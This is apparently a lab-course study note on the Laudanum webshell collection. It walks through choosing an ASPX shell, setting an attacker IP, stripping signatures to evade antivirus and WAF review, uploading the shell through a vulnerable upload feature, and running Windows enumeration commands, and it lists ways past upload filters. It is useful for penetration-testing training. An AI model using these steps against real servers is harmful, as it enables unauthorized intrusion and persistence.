# Laudanum Webshells

## Overview

**Laudanum** is a collection of ready-to-use webshells and payload files for multiple web technologies.

Supported languages include:

- ASP
- ASPX
- JSP
- PHP
- ColdFusion
- Perl
- others

Capabilities:

- execute commands via browser
- upload files
- download files
- establish reverse shells
- interact with compromised web servers

Laudanum is commonly used when:

- exploiting file upload vulnerabilities
- achieving RCE through web applications
- testing server-side execution capability
- gaining initial foothold on web servers

---

# 1. Laudanum Location

On Kali / Parrot OS:

```bash
/usr/share/laudanum
```

---

## View Directory

```bash
ls /usr/share/laudanum
```

Example structure:

```text
aspx/
asp/
jsp/
php/
perl/
```

---

# 2. Selecting a Webshell

Choose shell based on target technology stack.

Examples:

| Target | Shell Type |
|--------|------------|
| IIS | ASPX |
| Apache + PHP | PHP |
| Tomcat | JSP |
| legacy ASP | ASP |

Example ASPX shell:

```bash
/usr/share/laudanum/aspx/shell.aspx
```

---

# 3. Prepare Shell for Use

Copy file to working directory:

```bash
cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

Rename file if needed:

```text
shell.aspx
upload.aspx
status.aspx
default.aspx
demo.aspx
```

Choose filename appropriate to environment.

---

# 4. Configure Attacker IP

Edit file:

```bash
nano demo.aspx
```

Locate variable:

```text
allowedIps
```

Add attacker IP:

```text
<attacker ip>
```

Example:

```text
allowedIps = "10.10.14.22"
```

Purpose:

restrict access to shell.

---

## OPSEC Consideration

Consider removing:

- ASCII art
- comments
- obvious signatures

These may be detected by:

- AV scanning
- WAF inspection
- manual review

---

# 5. Upload the Webshell

Upload via vulnerable functionality.

Common vectors:

- unrestricted file upload
- weak file extension validation
- misconfigured IIS directory
- exposed upload portal
- WebDAV upload
- CMS upload feature

Example:

status portal upload page.

---

# 6. Identify Upload Location

Application may return file path.

Example:

```text
/files/demo.aspx
```

Important considerations:

- upload directory may differ
- filename may change
- file extension may be altered
- directory listing may be disabled

---

# 7. Accessing the Shell

Example URL:

```text
http://status.inlanefreight.local/files/demo.aspx
```

Note:

Windows paths may use:

```text
\files\
```

Browser normalizes to:

```text
/files/
```

---

# 8. Using the Shell

Laudanum webshell allows execution of OS commands.

Example commands:

```cmd
whoami
hostname
ipconfig
systeminfo
dir
```

---

## Example Enumeration

```cmd
whoami
whoami /priv
net users
net localgroup administrators
systeminfo
```

---

## File System Interaction

```cmd
dir
cd
type file.txt
copy
move
del
```

---

# 9. Typical Workflow

1. identify upload functionality
2. choose appropriate Laudanum shell
3. modify IP restrictions if required
4. upload shell
5. locate uploaded file
6. access via browser
7. execute commands
8. establish persistence or reverse shell if needed

---

# 10. Common Obstacles

Upload restrictions:

- extension filtering
- MIME type validation
- file renaming
- restricted directories
- execution disabled in upload folder

Possible bypass approaches:

- double extensions
- alternative extensions
- upload to executable directory
- leveraging misconfigured permissions

---

# 11. Laudanum vs Antak

| Feature | Laudanum | Antak |
|--------|----------|-------|
| multi-language | yes | no |
| PowerShell interface | no | yes |
| ASP.NET focused | optional | yes |
| simple command shell | yes | yes |
| file upload support | depends on shell | yes |
| credential protection | configurable | built-in |
| Windows focused | partial | yes |

---

# Cheatsheet

## Locate Laudanum

```bash
ls /usr/share/laudanum
```

---

## Copy ASPX shell

```bash
cp /usr/share/laudanum/aspx/shell.aspx demo.aspx
```

---

## Edit IP restriction

```bash
nano demo.aspx
```

Modify:

```text
allowedIps
```

---

## Upload shell

Upload via vulnerable application.

---

## Access shell

```text
http://target/files/demo.aspx
```

---

## Run commands

```cmd
whoami
hostname
systeminfo
dir
```

---

# Related Notes

- Antak webshell
- file upload vulnerabilities
- IIS exploitation
- reverse shells
- PowerShell execution
- web application RCE

---

# Tags

#webshell #laudanum #aspx #php #jsp #iis #rce #file-upload #oscp